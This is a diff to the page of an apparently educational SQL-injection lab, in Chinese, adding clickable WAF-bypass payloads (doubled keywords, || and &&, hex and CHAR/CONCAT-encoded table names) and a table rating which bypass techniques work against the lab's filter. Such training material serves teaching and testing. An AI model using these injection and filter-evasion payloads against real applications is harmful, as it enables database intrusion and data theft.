@@ -336,19 +336,113 @@ $conn->close();
                 <code onclick="setId('1 anandd 1=1')">1 anandd 1=1</code>
                 <code onclick="setId('1 whewherere 1=1')">1 whewherere 1=1</code>
                 <p style="color: #888; font-size: 12px;">WAF过滤列表中的关键词都可以用双写绕过</p>
+                
+                <h4>5. 逻辑运算符替换</h4>
+                <code onclick="setId('1 || 1=1')">1 || 1=1</code>
+                <code onclick="setId('1 && 1=1')">1 && 1=1</code>
+                <p style="color: #888; font-size: 12px;">使用 || 代替 OR，&& 代替 AND</p>
+                
+                <h4>6. 十六进制编码</h4>
+                <code onclick="setId('0 ununionion seselectlect 1,2,3,4,5 frfromom 0x666c616773')">0 ununionion seselectlect 1,2,3,4,5 frfromom 0x666c616773</code>
+                <p style="color: #888; font-size: 12px;">0x666c616773 = 'flags' 的十六进制编码</p>
+                
+                <h4>7. CONCAT分割</h4>
+                <code onclick="setId('0 ununionion seselectlect 1,2,3,4,5 frfromom CONCAT(CHAR(102),CHAR(108),CHAR(97),CHAR(103),CHAR(115))')">0 ununionion seselectlect 1,2,3,4,5 frfromom CONCAT(CHAR(102),CHAR(108),CHAR(97),CHAR(103),CHAR(115))</code>
+                <p style="color: #888; font-size: 12px;">使用CHAR函数构造表名绕过关键词检测</p>
             </div>
             
             <div class="bypass-techniques">
-                <h4>🔓 常见绕过技术</h4>
-                <ul style="line-height: 1.6;">
-                    <li><strong>大小写混合：</strong>如 <code>UnIoN</code>、<code>SeLeCt</code></li>
-                    <li><strong>双写绕过：</strong>如 <code>ununionion</code>、<code>seselectlect</code></li>
-                    <li><strong>注释绕过：</strong>如 <code>/*!UNION*/</code>、<code>/**/</code></li>
-                    <li><strong>编码绕过：</strong>如URL编码、十六进制编码</li>
-                    <li><strong>特殊字符：</strong>如空格的替代字符 <code>%20</code>、<code>+</code>、<code>/**/</code></li>
-                    <li><strong>函数替代：</strong>使用功能相似的函数</li>
-                    <li><strong>语句构造：</strong>改变SQL语句的结构</li>
-                </ul>
+                <h4>🔓 完整绕过技术列表</h4>
+                <table style="width: 100%; border-collapse: collapse; margin-top: 15px;">
+                    <thead>
+                        <tr style="background: #667eea; color: white;">
+                            <th style="padding: 10px; text-align: left;">绕过技术</th>
+                            <th style="padding: 10px; text-align: left;">示例</th>
+                            <th style="padding: 10px; text-align: center;">当前环境</th>
+                            <th style="padding: 10px; text-align: left;">说明</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr style="background: #d4edda;">
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>双写绕过</strong></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>ununionion</code>、<code>seselectlect</code></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">WAF替换一次后仍保留有效关键词</td>
+                        </tr>
+                        <tr style="background: #f8d7da;">
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>大小写混合</strong></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>UnIoN</code>、<code>SeLeCt</code></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">❌ 不可用</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">WAF使用str_ireplace，不区分大小写</td>
+                        </tr>
+                        <tr style="background: #f8d7da;">
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>注释绕过</strong></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>/*!UNION*/</code>、<code>/**/</code></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">❌ 不可用</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">/* 和 */ 被WAF过滤</td>
+                        </tr>
+                        <tr style="background: #f8d7da;">
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>内联注释</strong></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>/*!50000union*/</code></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">❌ 不可用</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">/* 被过滤，无法使用内联注释</td>
+                        </tr>
+                        <tr style="background: #d4edda;">
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>编码绕过</strong></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">URL编码 <code>%20</code>、<code>%2b</code></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">浏览器自动解码后WAF无法识别</td>
+                        </tr>
+                        <tr style="background: #d4edda;">
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>空格替换</strong></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>+</code>、<code>%0b</code>、<code>%0c</code></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">使用其他空白字符替代空格</td>
+                        </tr>
+                        <tr style="background: #d4edda;">
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>逻辑运算符替换</strong></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>&&</code>代替AND、<code>||</code>代替OR</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">使用未被过滤的逻辑运算符</td>
+                        </tr>
+                        <tr style="background: #d4edda;">
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>十六进制编码</strong></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>0x7573657273</code>代替'users'</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">字符串使用十六进制表示</td>
+                        </tr>
+                        <tr style="background: #d4edda;">
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>CHAR函数</strong></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>CHAR(117,115,101,114,115)</code></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">使用CHAR函数构造字符串</td>
+                        </tr>
+                        <tr style="background: #d4edda;">
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>CONCAT函数</strong></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>CONCAT('fl','ags')</code></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">分割关键词避免被检测</td>
+                        </tr>
+                        <tr style="background: #f8d7da;">
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>单行注释</strong></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>--</code>、<code>#</code></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">❌ 不可用</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">-- 和 # 被WAF过滤</td>
+                        </tr>
+                        <tr style="background: #d4edda;">
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>反引号</strong></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>`table_name`</code></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">使用反引号包裹标识符</td>
+                        </tr>
+                        <tr style="background: #d4edda;">
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>括号绕过</strong></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>(select 1)</code>、<code>(1)</code></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">使用括号改变语法结构</td>
+                        </tr>
+                    </tbody>
+                </table>
             </div>
         </div>
 
